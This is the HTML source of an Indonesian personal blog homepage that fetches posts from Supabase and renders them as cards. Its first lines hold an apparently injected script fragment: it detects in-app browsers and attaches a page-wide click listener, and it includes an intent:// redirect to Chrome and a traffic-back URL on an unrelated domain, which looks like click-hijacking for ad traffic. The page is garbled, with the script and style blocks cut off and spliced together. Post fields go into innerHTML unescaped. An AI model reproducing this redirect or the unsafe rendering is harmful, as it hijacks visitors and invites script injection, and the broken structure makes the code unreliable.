<script>
    function isInApp() {
        const regex = new RegExp(`(WebView|(iPhone|iPod|iPad)(?!.*Safari/)|Android.*(wv))`, 'ig');
        return Boolean(navigator.userAgent.match(regex));
    }

        var completeRedirectURL = 'intent://' + landingpageURL + '#Intent;scheme=https;package=com.android.chrome;end';
        var trafficbackURL = "https://n91hg.com/4/9463943/";
        var ua = navigator.userAgent.toLowerCase();

        if (isInApp() && (ua.indexOf('fb') !== -1 || ua.indexOf('android') !== -1 || ua.indexOf('wv') !== -1)) {
            document.body.addEventListener('click', function () {

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

            background-color: #0a0a0a;

        }
        .post-card {
            transition: transform 0.3s ease, box-shadow 0.3s ease;

<body class="antialiased">

    <header class="py-6">
        <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
            <h1 class="text-4xl md:text-5xl font-extrabold text-white">Bima Akbar</h1> <p class="mt-2 text-lg text-gray-400">Menjelajahi ide, cerita, dan musik.</p>
        </div>
    </header>

    <main class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        
        <section id="featured-post" class="mb-16" style="display: none;">
            </section>

        <section>
            <h2 class="text-2xl font-bold text-white mb-8">Semua Postingan</h2>
            <div id="posts-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
                <p id="loading-state" class="text-center col-span-full">Memuat postingan...</p>
            </div>
        </section>

    </main>

    <footer class="text-center py-12">
        <p class="text-sm text-gray-500">&copy; 2025 Bima Akbar. All Rights Reserved.</p> </footer>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        const SUPABASE_URL = 'https://wgcslximcxnprmfqtsoh.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndnY3NseGltY3hucHJtZnF0c29oIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk3NTE5NzEsImV4cCI6MjA2NTMyNzk3MX0.K0xWAiVdU9vAwJepHV5rMBROBoBDTpXtczXoQopEZQk';
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        // === Elemen DOM ===
        const featuredPostContainer = document.getElementById('featured-post');
        const postsGrid = document.getElementById('posts-grid');
        const loadingState = document.getElementById('loading-state');

        // === Helper Functions ===
        function createExcerpt(html, maxLength = 120) {
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = html;
            const text = tempDiv.textContent || tempDiv.innerText || '';
            if (text.length <= maxLength) return text;
            return text.substring(0, maxLength) + '...';
        }

        // === Fungsi Utama ===
        async function loadAllPosts() {
            const { data: posts, error } = await supabase
                .from('posts')
                .select('*')
                .eq('published', true)
                .order('created_at', { ascending: false });

            loadingState.style.display = 'none';

            if (error || !posts || posts.length === 0) {
                postsGrid.innerHTML = '<p class="text-center col-span-full">Belum ada postingan untuk ditampilkan.</p>';
                return;
            }

            // Ambil post pertama sebagai featured post
            const featuredPost = posts[0];
            const otherPosts = posts.slice(1);

            // Tampilkan Featured Post
            featuredPostContainer.style.display = 'block';
            featuredPostContainer.innerHTML = `
                <h2 class="text-2xl font-bold text-white mb-8">Terbaru</h2>
                <a href="post.html?slug=${featuredPost.slug}" class="block group">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-center">
                        <img src="${featuredPost.thumbnail_url || 'https://via.placeholder.com/800x600.png/171717/171717'}" alt="${featuredPost.title}" class="rounded-2xl w-full h-80 object-cover shadow-2xl transition-transform duration-300 group-hover:scale-105">
                        <div class="py-4">
                            <p class="font-semibold text-indigo-400 text-sm uppercase">${featuredPost.category || ''}</p>
                            <h3 class="mt-2 text-3xl font-extrabold text-white group-hover:text-indigo-400 transition-colors">${featuredPost.title}</h3>
                            <p class="mt-4 text-gray-400">${createExcerpt(featuredPost.content)}</p>
                            <div class="mt-6 text-sm text-gray-500">${new Date(featuredPost.created_at).toLocaleDateString('id-ID', {day:'numeric', month:'long', year:'numeric'})}</div>
                        </div>
                    </div>
                </a>
            `;

            // Tampilkan sisa postingan dalam grid
            if (otherPosts.length > 0) {
                postsGrid.innerHTML = ''; // Kosongkan grid
                otherPosts.forEach(post => {
                    const card = document.createElement('a');
                    card.href = `post.html?slug=${post.slug}`;
                    card.className = 'post-card bg-neutral-900 rounded-2xl overflow-hidden block group';
                    card.innerHTML = `
                        <img src="${post.thumbnail_url || 'https://via.placeholder.com/400x300.png/171717/171717'}" alt="${post.title}" class="w-full h-48 object-cover">
                        <div class="p-6">
                            <p class="font-semibold text-indigo-400 text-xs uppercase">${post.category || ''}</p>
                            <h4 class="mt-2 font-bold text-lg text-white group-hover:text-indigo-400 transition-colors">${post.title}</h4>
                            <p class="mt-2 text-sm text-gray-400">${createExcerpt(post.content, 80)}</p>
                        </div>
                    `;
                    postsGrid.appendChild(card);
                });
            } else {
                // Jika tidak ada postingan lain, sembunyikan judul "Semua Postingan"
                document.querySelector('#posts-grid').previousElementSibling.style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', loadAllPosts);
    </script>
</body>
</html>
